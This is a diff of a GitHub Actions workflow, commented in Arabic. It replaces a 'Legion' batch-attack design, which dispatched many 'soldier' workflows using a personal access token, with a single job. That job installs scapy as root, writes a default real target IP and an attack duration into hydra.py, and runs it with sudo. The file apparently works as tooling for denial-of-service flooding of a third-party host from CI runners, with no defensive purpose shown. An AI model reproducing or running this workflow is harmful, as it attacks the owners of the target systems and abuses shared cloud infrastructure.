@@ -1,5 +1,5 @@
-# اسم الـ Workflow: Legion - Batch Attack Strategy (v10 - Final Loop)
-name: Legion - Batch Attack (v10)
+# اسم الـ Workflow: Debug and Run Hydra (v12 - Simplest)
+name: Debug and Run Hydra (v12)
 
 on:
   workflow_dispatch:
@@ -8,71 +8,53 @@ on:
         description: 'عنوان IP الهدف'
         required: true
         default: '63.246.154.12'
-      duration_per_batch:
-        description: 'مدة الهجوم لكل دفعة (بالثواني)'
+      duration:
+        description: 'مدة الهجوم بالثواني'
         required: true
-        default: '300'
-      total_soldiers:
-        description: 'إجمالي عدد الجنود المراد إطلاقه'
-        required: true
-        default: '150'
-      batch_size:
-        description: 'حجم الدفعة الواحدة (يجب أن يكون أقل من 20)'
-        required: true
-        default: '19'
-      pat:
-        description: 'Your Personal Access Token (PAT)'
-        required: true
+        default: '120' # دقيقتان فقط للاختبار السريع
 
 jobs:
-  # المهمة الأولى: حساب عدد الدفعات وتوليد المصفوفة
-  calculate_batches:
-    runs-on: ubuntu-latest
-    outputs:
-      batch_matrix: ${{ steps.generate-matrix.outputs.matrix }}
-    steps:
-      - name: Calculate number of batches
-        id: generate-matrix
-        run: |
-          TOTAL=${{ github.event.inputs.total_soldiers }}
-          SIZE=${{ github.event.inputs.batch_size }}
-          NUM_BATCHES=$(( (TOTAL + SIZE - 1) / SIZE ))
-          MATRIX="{\"include\":["
-          for (( i=0; i<$NUM_BATCHES; i++ )); do
-            MATRIX+="{\"batch_number\":$i},"
-          done
-          MATRIX=$(echo $MATRIX | sed 's/,$//')
-          MATRIX+="]}"
-          echo "matrix=$MATRIX" >> $GITHUB_OUTPUT
-
-  # المهمة الثانية: قائد الفيلق الذي ينسق الدفعات (مع حلقة)
-  legion_commander:
-    # تعتمد على المهمة الأولى للحصول على المصفوفة
-    needs: calculate_batches
+  # مهمة واحدة فقط، بدون أي استراتيجيات
+  single_attack_test:
     runs-on: ubuntu-latest
     
-    # --- هذا هو الجزء الذي يعيد الحلقة ---
-    # سيتم تشغيل هذه المهمة لكل دفعة تم حسابها
-    strategy:
-      fail-fast: false
-      matrix: ${{ fromJson(needs.calculate_batches.outputs.batch_matrix) }}
-
     steps:
-      - name: Announce and Dispatch Batch
-        run: |
-          # استخدام bash لإجراء العملية الحسابية بشكل آمن
-          BATCH_NUM=$(( ${{ matrix.batch_number }} + 1 ))
-          echo "===== بدء الدفعة رقم: $BATCH_NUM ====="
-        
-      - name: Dispatch Soldier Batch
-        uses: benc-uk/workflow-dispatch@v1
+      - name: Checkout repository
+        uses: actions/checkout@v3
+
+      - name: Set up Python 3.9
+        uses: actions/setup-python@v3
         with:
-          workflow: soldier.yml
-          # استخدام التوكن الذي تم إدخاله يدويًا
-          token: ${{ github.event.inputs.pat }}
-          inputs: >
-            {
-              "target_ip": "${{ github.event.inputs.target_ip }}",
-              "duration": "${{ github.event.inputs.duration_per_batch }}",
-              "swarm_size": "${{ github.event.inputs.batch_size }}"
-            }
+          python-version: 3.9
+
+      - name: Install dependencies for ROOT
+        run: |
+          echo "تثبيت المكتبات باستخدام sudo..."
+          sudo python3 -m pip install --upgrade pip
+          sudo pip3 install scapy aiodns
+          echo "تم تثبيت المكتبات."
+
+      - name: Prepare and Verify
+        run: |
+          echo "تعديل الكود بالمدخلات..."
+          sed -i "s/TARGET_IP = .*/TARGET_IP = \"${{ github.event.inputs.target_ip }}\"/" hydra.py
+          sed -i "s/DURATION = .*/DURATION = ${{ github.event.inputs.duration }}/" hydra.py
+          
+          echo "--- محتوى الكود قبل التشغيل ---"
+          cat hydra.py
+          echo "--------------------------------"
+          
+          echo "التحقق من إصدار بايثون وصلاحيات sudo..."
+          python3 --version
+          sudo python3 --version
+          echo "التحقق من وجود scapy لمستخدم root..."
+          sudo python3 -c "import scapy; print('Scapy is available for root!')"
+
+      - name: Launch Hydra and Monitor
+        # ضمان استمرار المهمة للمدة المطلوبة + دقيقة
+        timeout-minutes: ${{ (github.event.inputs.duration / 60) + 1 }}
+        run: |
+          echo "بدء تشغيل hydra.py الآن..."
+          # التشغيل المباشر مع طباعة المخرجات والأخطاء مباشرة في سجل المهمة
+          sudo python3 -u hydra.py
+          echo "انتهى تشغيل hydra.py."
